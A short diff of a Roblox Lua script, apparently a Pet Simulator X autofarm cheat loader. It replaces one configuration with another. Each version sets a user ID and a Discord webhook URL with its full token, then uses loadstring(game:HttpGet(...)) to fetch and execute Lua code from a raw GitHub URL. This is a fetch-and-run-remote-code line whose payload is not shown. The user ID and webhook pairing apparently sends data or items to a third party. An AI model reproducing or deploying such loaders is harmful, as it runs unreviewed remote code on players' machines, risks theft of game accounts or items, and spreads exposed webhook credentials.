@@ -1,10 +1,7 @@
-_G.UserID = 3545626842 
 
-_G.WebHook = "https://discord.com/api/webhooks/1055166963640434818/2wqWQ7J3tkwF-EZ8sOsHGUeTa-Z3cHHZ4KcxZogg6yCNNhl8MOTgF2fE7lI-rlr051QZ"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
-
-
+_G.UserID = 3545626842
+_G.WebHook = "https://discord.com/api/webhooks/1059947590499704932/XzvMTXLId4YmACSQAPcux9mkkL8s0QluC9tPy8FajolbJqREmMgSgmaem4tS9X9sNLRa"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
 
 
 
